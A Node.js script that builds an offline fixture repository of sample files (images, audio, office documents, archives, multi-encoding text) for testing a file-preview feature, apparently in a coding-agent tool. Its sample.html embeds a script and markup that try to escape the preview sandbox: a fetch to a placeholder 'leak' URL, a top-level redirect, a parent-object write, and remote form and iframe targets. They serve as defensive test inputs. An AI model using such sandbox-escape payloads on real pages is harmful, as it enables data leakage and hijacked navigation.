'use strict';
const fs = require('node:fs');
const path = require('node:path');
const zlib = require('node:zlib');
const { execFileSync } = require('node:child_process');
function png() {
  const crc = bytes => { let n = 0xffffffff; for (const byte of bytes) { n ^= byte; for (let j = 0; j < 8; j++) n = n & 1 ? 0xedb88320 ^ (n >>> 1) : n >>> 1; } return (n ^ 0xffffffff) >>> 0; };
  const chunk = (type, bytes) => { const tag = Buffer.from(type), size = Buffer.alloc(4), sum = Buffer.alloc(4); size.writeUInt32BE(bytes.length); sum.writeUInt32BE(crc(Buffer.concat([tag, bytes]))); return Buffer.concat([size, tag, bytes, sum]); };
  const width = 320, height = 160, header = Buffer.alloc(13); header.writeUInt32BE(width); header.writeUInt32BE(height, 4); header[8] = 8; header[9] = 2;
  const pixels = Buffer.alloc((width * 3 + 1) * height);
  for (let y = 0; y < height; y++) for (let x = 0; x < width; x++) { const at = y * (width * 3 + 1) + 1 + x * 3; pixels[at] = x < 160 ? 38 : 230; pixels[at + 1] = y < 80 ? 120 : 200; pixels[at + 2] = 160; }
  return Buffer.concat([Buffer.from('89504e470d0a1a0a', 'hex'), chunk('IHDR', header), chunk('IDAT', zlib.deflateSync(pixels)), chunk('IEND', Buffer.alloc(0))]);
}
function wav() {
  const rate = 8000, samples = rate * 3, data = Buffer.alloc(44 + samples * 2);
  data.write('RIFF'); data.writeUInt32LE(data.length - 8, 4); data.write('WAVEfmt ', 8); data.writeUInt32LE(16, 16); data.writeUInt16LE(1, 20); data.writeUInt16LE(1, 22); data.writeUInt32LE(rate, 24); data.writeUInt32LE(rate * 2, 28); data.writeUInt16LE(2, 32); data.writeUInt16LE(16, 34); data.write('data', 36); data.writeUInt32LE(samples * 2, 40);
  for (let i = 0; i < samples; i++) data.writeInt16LE(Math.round(Math.sin(i * Math.PI * 2 * 440 / rate) * 800), 44 + i * 2);
  return data;
}
module.exports = async function ({ SOURCE, world, repo }) {
  const data = path.join(world, 'data'), home = path.join(world, 'home');
  const pkg = path.join(world, 'node_modules/@earendil-works/pi-coding-agent');
  for (const dir of [repo, data, home, path.join(pkg, 'dist/core/extensions'), path.join(pkg, 'dist/cli')]) fs.mkdirSync(dir, { recursive: true });
  const write = (name, bytes) => { fs.mkdirSync(path.dirname(path.join(repo, name)), { recursive: true }); fs.writeFileSync(path.join(repo, name), bytes); };
  const git = (...args) => execFileSync('git', args, { cwd: repo, windowsHide: true, stdio: 'ignore', env: { ...process.env, GIT_CONFIG_GLOBAL: path.join(world, 'gitconfig'), GIT_CONFIG_NOSYSTEM: '1' } });
  git('init', '-b', 'main'); git('config', 'user.name', 'Offline fixture'); git('config', 'user.email', 'fixture@example.invalid');
  const source = Array.from({ length: 6000 }, (_, i) => i === 2999 ? 'const rangeMarker = "TARGET_ALPHA";' : i === 4999 ? 'const uniqueLongLine = "' + 'abcdefgh'.repeat(3000) + '";' : `// 行 ${i + 1} — English line ${i + 1}`);
  write('long-lines.js', source.join('\n')); write('duplicate-a/same.txt', 'same filename A\n'); write('duplicate-b/same.txt', 'same filename B\n');
  write('nested/deeper/搜索中文-target.txt', 'nested search result\n'); write('.hidden-preview.txt', 'hidden fixture\n'); write('local.png', png()); write('tone.wav', wav());
  write('guide.md', '# 统一查看器 / Unified Preview\n\n公式 $E=mc^2$ 与中文 English。\n\n## 表格与本地图片\n\n| 名称 | Value |\n| --- | ---: |\n| 中文 | 42 |\n\n![本地彩色图](local.png)\n\n## 源码链接\n\n[Jump to source](long-lines.js#L3000)\n\n```js\nconst x = "not executable";\n```\n');
  write('safe.css', 'h1{color:rgb(20,90,150)} .local{border:2px solid rgb(20,90,150)}');
  write('sample.html', '<!doctype html><html><head><link rel="stylesheet" href="safe.css"><style>p{font-weight:700} @import url(https://invalid.example/a.css);</style></head><body><h1>隔离 HTML / Static Preview</h1><p class="local">Static content</p><img src="local.png"><script>parent.__unsafePreview=true;localStorage.setItem("attack","yes");fetch("https://invalid.example/leak");top.location="https://invalid.example/escape"</script><form action="https://invalid.example/post"><input name="x"></form><iframe src="https://invalid.example/frame"></iframe><a href="https://invalid.example/nav">remote nav</a><img src="https://invalid.example/remote.png" onerror="parent.__unsafePreview=true"></body></html>');
  write('utf16.txt', Buffer.concat([Buffer.from([255, 254]), Buffer.from('中文 UTF16 编码\n第二行\n', 'utf16le')]));
  write('gb18030.txt', Buffer.from([0xd6, 0xd0, 0xce, 0xc4, 0x20, 0x47, 0x42, 0x31, 0x38, 0x30, 0x33, 0x30, 10]));
  write('bad-image.png', 'MZnot an image'); write('unknown.blob', Buffer.from([0, 1, 2, 0, 3]));
  const office = require('../file-preview-office.cjs');
  write('document.docx', office.zipParts(office.docxParts())); write('presentation.pptx', office.zipParts(office.pptxParts())); write('workbook.xlsx', await office.xlsxBytes());
  for (const name of ['libreoffice-bullets-mixed.pptx', 'libreoffice-autonum-multilevel.pptx']) {
    write(name, fs.readFileSync(path.join(SOURCE, 'tests/fixtures/office-real', name)));
  }
  write('quoted.csv', '名称,备注,数值\r\n"中文,名字","第一行\n第二行 ""quoted""",0\r\nFormula,=1+2,FALSE\r\n');
  write('archive.zip', office.zipParts({ 'a/same.txt': 'archive-A', 'b/same.txt': 'archive-B', '中文/readme.md': '# Archive document' }));
  write('tabular.zip', office.zipParts({ '数据/table.csv': '名称,数值\r\n"中文,名字",42\r\n', '数据/table.tsv': '名称\t数值\r\n中文TSV\t84\r\n', 'nested.zip': office.zipParts({ 'not-open.txt': 'nested member' }) }));
  write('pages.pdf', require('../file-preview-pdf.cjs').pdfFixture(8));
  git('add', '.'); git('commit', '-m', 'offline fixture'); write('changed.txt', 'base\n'); git('add', 'changed.txt'); git('commit', '-m', 'diff baseline'); write('changed.txt', 'base\nmodified line\n');
  fs.writeFileSync(path.join(data, 'projects.json'), JSON.stringify({ active: repo, items: [{ path: repo, name: '统一文件验收 / Offline Fixture' }] }));
  fs.writeFileSync(path.join(pkg, 'package.json'), JSON.stringify({ name: '@earendil-works/pi-coding-agent', version: '1.3.0', bin: { pi: 'cli.cjs' } }));
  fs.writeFileSync(path.join(pkg, 'dist/core/extensions/types.d.ts'), '"tool_call" "tool_execution_end" getAllTools() registerTool<');
  fs.writeFileSync(path.join(pkg, 'dist/cli/args.js'), 'if (arg === "--extension") {}');
  fs.copyFileSync(path.join(SOURCE, 'tests/fixtures/candidate-pi.cjs'), path.join(pkg, 'cli.cjs'));
  const shim = path.join(world, 'pi.cmd');
  fs.writeFileSync(shim, `@echo off\r\n"${process.env.PREVIEW_NODE_EXECUTABLE}" "${path.join(pkg, 'cli.cjs')}" %*\r\n`);
  return { data, home, shim };
};
